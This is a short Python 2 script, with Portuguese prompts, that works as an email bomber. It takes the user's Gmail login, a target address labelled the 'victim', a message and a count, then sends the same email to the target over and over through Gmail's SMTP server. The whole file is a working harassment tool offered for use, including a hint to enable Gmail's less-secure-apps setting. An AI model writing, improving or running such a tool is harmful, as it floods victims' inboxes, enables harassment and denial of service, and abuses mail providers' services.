#!/usr/bin/python
import smtplib
import time
import os
import getpass
import sys

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'


def bomb():
	os.system('clear')
print(bcolors.WARNING + '''
INICIANDO ATAQUE! AGUARDE.
''' + bcolors.ENDC + '------------------------------------------------------')


os.system('clear')
try:
	file1 = open('Banner.txt', 'r')
	print(' ')
	file1.close()
except IOError:
	print('Banner nao encontrado')

#Input
print(bcolors.WARNING + '''
Digite a senha (1) para continuar!
''' + bcolors.ENDC + '------------------------------------------------------')
try:
	server = raw_input(bcolors.OKGREEN + 'Insira a senha: ' + bcolors.ENDC)
	user = raw_input(bcolors.OKGREEN + 'Insira seu email: ' + bcolors.ENDC)
	pwd = getpass.getpass(bcolors.OKGREEN + 'Insira a senha do email: ' + bcolors.ENDC)
	to = raw_input(bcolors.OKGREEN + 'Insira o email da vitima: ' + bcolors.ENDC)
	subject = raw_input(bcolors.OKGREEN + 'Insira o assunto (opcional): ' + bcolors.ENDC)
	body = raw_input(bcolors.OKGREEN + 'Insira a mensagem para enviar pra vitima: ' + bcolors.ENDC)
	nomes = input(bcolors.OKGREEN + 'Insira o numero de vezes a enviar: ' + bcolors.ENDC)
	no = 0
	message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
except KeyboardInterrupt:
	print bcolors.FAIL + '\nCancelado' + bcolors.ENDC
	sys.exit()

#Gmail

if server == '1' or server == 'gmail' or server == 'Gmail':
	bomb()
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + '''Seu nome de usuario ou senha estao incorretos, tente novamente usando as credenciais corretas
		Ou voce precisa habilitar aplicativos menos seguros
		No Gmail: https://myaccount.google.com/lesssecureapps ''' + bcolors.ENDC
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print bcolors.WARNING + 'Enviada com sucesso ' + str(no+1) + ' emails' + bcolors.ENDC
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print bcolors.FAIL + '\nCancelado' + bcolors.ENDC
			sys.exit()
		except:
			print "Falha ao enviar"
	server.close()
	

	
else:
	print 'Insira a senha corretamente.'
	sys.exit()
